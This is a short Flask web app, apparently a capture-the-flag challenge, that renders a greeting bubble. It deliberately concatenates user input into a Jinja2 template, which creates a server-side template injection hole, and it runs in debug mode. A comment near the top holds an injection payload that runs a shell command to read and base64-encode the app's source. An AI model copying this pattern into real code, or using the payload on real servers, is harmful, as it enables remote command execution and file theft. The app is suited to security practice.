# flask_web/app.py
# {{ ''.__class__.__mro__[2].__subclasses__()[258]('cat /opt/app/app.py | base64', shell=True,stdout=-1).communicate()[0] }}

from flask import Flask,render_template,redirect, url_for, request
from textwrap import wrap
from jinja2 import Environment, BaseLoader

app = Flask(__name__)

@app.route('/', methods=["POST", "GET"])
def main(eyes="*", name="Hacker"):
  eyes = request.form.get('eyes', "*")
  name = request.form.get('name', "Hacker")

  text = Environment(loader=BaseLoader()).from_string("Hello, mighty " + name).render()
  print("Text: " + text)
  t = wrap(text, width=30)
  l = 0;
  for line in t:
    if len(line) > l:
      l = len(line);
  bubble = ' ' + (l + 2) * '-' + '\n' 
  for line in t:
    bubble = bubble + '( ' + line + (l - len(line)) * ' ' + ' )\n'
  bubble = bubble + ' ' + (l + 2) * '-' 
  print(bubble)
#  text = Environment.from_string('Hello ' + text).render()
  if(eyes == 'vader'):
    return render_template('vader.html', eyes=eyes, name=name, bubble=bubble)
  else:
    return render_template('regular.html', eyes=eyes, name=name, bubble=bubble)

if __name__ == "__main__":
  app.run(host='0.0.0.0' , port=7778, debug=True)